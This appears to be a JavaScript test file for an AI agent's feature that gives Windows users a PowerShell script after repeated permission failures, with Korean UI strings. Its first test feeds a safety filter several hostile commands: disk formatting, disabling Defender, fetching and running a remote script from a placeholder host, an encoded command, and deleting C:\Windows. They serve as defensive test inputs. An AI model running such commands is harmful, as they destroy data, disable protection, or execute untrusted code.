import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs/promises';
import os from 'node:os';
import path from 'node:path';
import {unsafeScript,shouldHandOff,handoffCard,manualHandoff} from '../manual-handoff.mjs';
import {runAgentLoop} from '../agent-loop.mjs';

const plan={possible:true,needsAdmin:true,title:'프린터 대기열 비우기',explain:'인쇄 대기열이 멈춰 있어 직접 정리가 필요합니다.',
  steps:['인쇄 서비스를 멈춥니다','대기열 파일을 지웁니다','인쇄 서비스를 다시 켭니다'],risks:'대기 중인 인쇄물이 지워집니다.',
  script:"Stop-Service Spooler\nRemove-Item 'C:\\Windows\\System32\\spool\\PRINTERS\\*'\nStart-Service Spooler\nWrite-Host '완료'",check:'"완료"가 출력되고 인쇄가 됩니다.'};

test('dangerous scripts are never handed to the user',()=>{
  assert.match(unsafeScript('Format-Volume -DriveLetter D'),/디스크/);
  assert.match(unsafeScript('Set-MpPreference -DisableRealtimeMonitoring $true'),/백신/);
  assert.match(unsafeScript("iex (iwr 'https://x.example/a.ps1')"),/인터넷/);
  assert.match(unsafeScript('powershell -EncodedCommand AAAA'),/숨긴/);
  assert.match(unsafeScript("Remove-Item 'C:\\Windows' -Recurse"),/시스템 폴더/);
  assert.equal(unsafeScript(plan.script),'');
});

test('hand-off only after repeated real failures of an action task the user did not stop',()=>{
  const failed=n=>Array.from({length:n},()=>({tool:'run',ok:false}));
  assert.equal(shouldHandOff({complete:false,answer:'끝내지 못했습니다',events:failed(3)},{kind:'action'}),false,'no permission error → no hand-off');
  assert.equal(shouldHandOff({complete:false,answer:'마지막 오류: 액세스가 거부되었습니다',events:failed(3)},{kind:'action'}),true);
  assert.equal(shouldHandOff({complete:false,answer:'액세스가 거부되었습니다',task:{goal:'녹화해서 Gmail로 전송'},events:failed(5)},{kind:'action'}),false,'account work is never handed off');
  assert.equal(shouldHandOff({complete:false,answer:'액세스가 거부되었습니다',events:failed(2)},{kind:'action'}),false);
  assert.equal(shouldHandOff({complete:true,answer:'액세스가 거부되었습니다',events:failed(5)},{kind:'action'}),false);
  assert.equal(shouldHandOff({complete:false,answer:'요청에 따라 작업을 중지했습니다.',events:failed(5)},{kind:'action'}),false);
  assert.equal(shouldHandOff({complete:false,answer:'사용자가 작업을 승인하지 않았습니다.',events:failed(5)},{kind:'action'}),false);
  assert.equal(shouldHandOff({complete:false,answer:'마지막 오류: 액세스가 거부되었습니다',events:failed(5)},{kind:'action'}),true);
  assert.equal(shouldHandOff({complete:false,answer:'x',events:failed(5)},{kind:'chat'}),false);
});

test('the card explains each step, the risk, how to open admin PowerShell, and the code',()=>{
  const card=handoffCard(plan,'C:\\w\\직접실행\\프린터.ps1');
  for(const part of ['인쇄 대기열이 멈춰','1. 인쇄 서비스를 멈춥니다','⚠ 주의: 대기 중인 인쇄물','터미널(관리자)','```powershell','Stop-Service Spooler','성공했는지 보는 법','직접실행\\프린터.ps1'])
    assert.ok(card.includes(part),part);
});

test('a refused or unsafe plan is not shown; a safe one is saved as a .ps1 file',async t=>{
  const root=await fs.mkdtemp(path.join(os.tmpdir(),'handoff-'));t.after(()=>fs.rm(root,{recursive:true,force:true}));
  let asked=0;const askUser=async()=>{asked++;return '하지 않을게요';};
  const result={complete:false,answer:'실패',events:[{tool:'run',ok:false}]};
  assert.equal(await manualHandoff({input:'x',result,chat:async()=>JSON.stringify({...plan,script:'diskpart'}),askUser,root}),null);
  assert.equal(await manualHandoff({input:'x',result,chat:async()=>JSON.stringify({...plan,possible:false}),askUser,root}),null);
  assert.equal(asked,0);
  const r=await manualHandoff({input:'x',result,chat:async()=>JSON.stringify(plan),askUser,root});
  assert.equal(r.declined,true);
  assert.ok((await fs.readFile(r.file,'utf8')).includes('Stop-Service Spooler'));
});

test('after repeated failures the user gets the script, and after running it the agent only checks the result',async t=>{
  const root=await fs.mkdtemp(path.join(os.tmpdir(),'handoff-loop-'));t.after(()=>fs.rm(root,{recursive:true,force:true}));
  const executed=[];let card=null,verifying=false;
  const result=await runAgentLoop({input:'프린터 대기열 비워줘',settings:{noSpec:true,toolAllow:['run','read','list','reply']},maxSteps:8,
    context:{root,askUser:async q=>{if(q.title?.startsWith('직접 실행해 주세요')){card=q;verifying=true;return '실행했어요';}return '작업 중지';}},
    chat:async(messages,f)=>{
      if(f?.properties?.script)return JSON.stringify(plan);
      if(f?.properties?.verified||f?.properties?.checks)return JSON.stringify({verified:true,quote:'비어 있음',gap:'',checks:[],missing:''});
      if(verifying){const done=messages.some(m=>m.role==='user' && /비어 있음/.test(m.content||''));
        return JSON.stringify(done?{tool:'reply',text:'대기열이 비어 있습니다.',path:'',thought:'끝'}:{tool:'list',path:'C:\\Windows\\System32\\spool\\PRINTERS',text:'',thought:'확인'});}
      return JSON.stringify({tool:'run',text:'Stop-Service Spooler '+executed.length,path:'',thought:'시도'});},
    execute:async a=>{executed.push(a.tool);if(a.tool==='run')throw Error('액세스가 거부되었습니다');return '(비어 있음)';}});
  assert.ok(card,'hand-off card was not shown');
  assert.match(card.question,/```powershell/);
  assert.match(result.answer,/직접 실행해 주신 결과를 확인했습니다/);
  const afterCard=executed.slice(executed.lastIndexOf('run')+1);
  assert.ok(afterCard.length && afterCard.every(t=>t!=='run'),executed.join(','));
});

test('placeholder scripts are never shown',async()=>{const {placeholderScript}=await import('../manual-handoff.mjs');assert.equal(placeholderScript('# 실제 발송 로직 (Send-MailMessage 등 사용)'),true);assert.equal(placeholderScript('Stop-Service Spooler; Write-Host 완료'),false);});
